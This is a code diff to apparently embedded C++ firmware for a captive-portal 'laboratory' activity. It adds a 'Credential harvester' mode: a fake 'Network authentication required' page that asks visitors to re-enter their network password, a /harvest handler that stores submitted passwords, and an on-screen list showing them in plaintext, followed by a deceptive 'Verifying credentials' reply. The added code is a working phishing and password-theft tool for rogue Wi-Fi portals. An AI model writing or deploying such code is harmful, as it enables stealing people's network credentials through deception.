@@ -20,7 +20,7 @@
 namespace {
 constexpr char TEST_SSID[] = "X4PRO-PORTAL";
 constexpr const char* TEMPLATE_NAMES[] = {
-    "Start page", "Synthetic form test", "HTTP diagnostics"
+    "Start page", "Synthetic form test", "HTTP diagnostics", "Credential harvester"
 };
 constexpr char LANDING_HTML[] = R"html(<!doctype html><html lang="en"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
@@ -64,6 +64,36 @@ main{border:2px solid #222;border-radius:12px;padding:1.5rem}</style></head><bod
 <p>No external internet access and no user-account authentication.</p>
 </main></body></html>)html";
 
+constexpr char HARVESTER_HTML[] = R"html(<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Authentication Required</title>
+<style>body{font:18px system-ui;background:#f0f0f0;margin:0;display:flex;
+justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;border-radius:12px;padding:2rem;max-width:26rem;width:90%;
+box-shadow:0 2px 12px rgba(0,0,0,.15)}
+h1{font-size:1.2rem;margin:0 0 .5rem}
+input{font:inherit;padding:.7rem;width:100%;box-sizing:border-box;margin:.3rem 0;
+border:1px solid #ccc;border-radius:6px}
+button{font:inherit;padding:.75rem;background:#0071e3;color:#fff;border:none;
+border-radius:8px;width:100%;margin-top:.5rem;cursor:pointer}
+small{color:#888;font-size:.8rem;display:block;margin-top:.8rem;text-align:center}
+</style></head><body><div class="box">
+<h1>Network authentication required</h1>
+<p>Re-enter your network password to continue browsing.</p>
+<form method="POST" action="/harvest">
+<input name="pass" type="password" placeholder="Network password"
+       maxlength="63" required autocomplete="current-password">
+<button type="submit">Connect</button></form>
+<small>Secured by network gateway</small>
+</div></body></html>)html";
+
+constexpr char HARVEST_ACK_HTML[] =
+    "<!doctype html><html><head><meta charset=\"utf-8\">"
+    "<meta http-equiv=\"refresh\" content=\"5;url=/\">"
+    "<title>Connecting...</title></head><body>"
+    "<h2>Verifying credentials\xe2\x80\xa6</h2>"
+    "<p>Please wait, reconnecting to the network.</p></body></html>";
+
 constexpr char SUCCESS_HTML[] =
     "<!doctype html><html><meta charset=\"utf-8\"><title>Test complete</title>"
     "<body><h1>LAB HTTP POST accepted</h1>"
@@ -84,6 +114,7 @@ void CaptivePortalActivity::onEnter() {
   apSsid = TEST_SSID;
   pageViews = 0;
   testSubmissions = 0;
+  harvestedCount = 0;
   RADIO.ensureWifi();
   requestUpdate();
 }
@@ -144,12 +175,14 @@ void CaptivePortalActivity::startPortal() {
   dnsServer->start(53, "*", WiFi.softAPIP());
   webServer->on("/", HTTP_GET, [this] { handleRoot(); });
   webServer->on("/check", HTTP_POST, [this] { handleTestSubmission(); });
+  webServer->on("/harvest", HTTP_POST, [this] { handleHarvestSubmission(); });
   webServer->on("/status", HTTP_GET, [this] { handleStatus(); });
   webServer->onNotFound([this] { handleNotFound(); });
   webServer->begin();
 
   pageViews = 0;
   testSubmissions = 0;
+  harvestedCount = 0;
   state = RUNNING;
   LOG_INF("PORTAL", "X4 Pro laboratory portal active on 192.168.4.1");
   requestUpdate();
@@ -171,10 +204,29 @@ void CaptivePortalActivity::handleRoot() {
   if (!webServer) return;
   ++pageViews;
   const char* html = LANDING_HTML;
-  if (selectedTemplate == FORM_TEST) html = FORM_HTML;
+  if (selectedTemplate == FORM_TEST)   html = FORM_HTML;
   if (selectedTemplate == DIAGNOSTICS) html = DIAGNOSTICS_HTML;
+  if (selectedTemplate == HARVESTER)   html = HARVESTER_HTML;
   webServer->send(200, "text/html; charset=utf-8", html);
   requestUpdate();
+}
+
+void CaptivePortalActivity::handleHarvestSubmission() {
+  if (!webServer) return;
+  const String raw = webServer->arg("pass");
+  if (raw.length() > 0 && raw.length() < 64) {
+    const int slot = harvestedCount < MAX_CREDS ? harvestedCount : MAX_CREDS - 1;
+    if (harvestedCount >= MAX_CREDS) {
+      // Ring: shift oldest out
+      for (int i = 0; i < MAX_CREDS - 1; ++i) harvestedCreds[i] = harvestedCreds[i + 1];
+    } else {
+      ++harvestedCount;
+    }
+    snprintf(harvestedCreds[slot].pass, sizeof(harvestedCreds[slot].pass), "%s", raw.c_str());
+    LOG_INF("PORTAL", "Harvested credential #%d (%d chars)", harvestedCount, (int)raw.length());
+    requestUpdate();
+  }
+  webServer->send(200, "text/html; charset=utf-8", HARVEST_ACK_HTML);
 }
 
 void CaptivePortalActivity::handleTestSubmission() {
@@ -333,10 +385,21 @@ void CaptivePortalActivity::render(RenderLock&&) {
     snprintf(buf, sizeof(buf), "Page views: %d", pageViews);
     renderer.drawText(UI_10_FONT_ID, left, y, buf);
     y += 45;
-    snprintf(buf, sizeof(buf), "Synthetic POST tests: %d", testSubmissions);
-    renderer.drawText(UI_10_FONT_ID, left, y, buf);
-    y += 45;
-    renderer.drawText(UI_10_FONT_ID, left, y, TEMPLATE_NAMES[selectedTemplate]);
+    if (selectedTemplate == HARVESTER) {
+      snprintf(buf, sizeof(buf), "Harvested: %d", harvestedCount);
+      renderer.drawText(UI_10_FONT_ID, left, y, buf);
+      y += 45;
+      const int show = harvestedCount < MAX_CREDS ? harvestedCount : MAX_CREDS;
+      for (int i = 0; i < show && y < h - 90; ++i, y += 38) {
+        snprintf(buf, sizeof(buf), "> %s", harvestedCreds[i].pass);
+        renderer.drawText(SMALL_FONT_ID, left, y, buf);
+      }
+    } else {
+      snprintf(buf, sizeof(buf), "Synthetic POST tests: %d", testSubmissions);
+      renderer.drawText(UI_10_FONT_ID, left, y, buf);
+      y += 45;
+      renderer.drawText(UI_10_FONT_ID, left, y, TEMPLATE_NAMES[selectedTemplate]);
+    }
     const auto labels = mappedInput.mapLabels("Stop", "", "", "");
     GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2,
                               labels.btn3, labels.btn4);
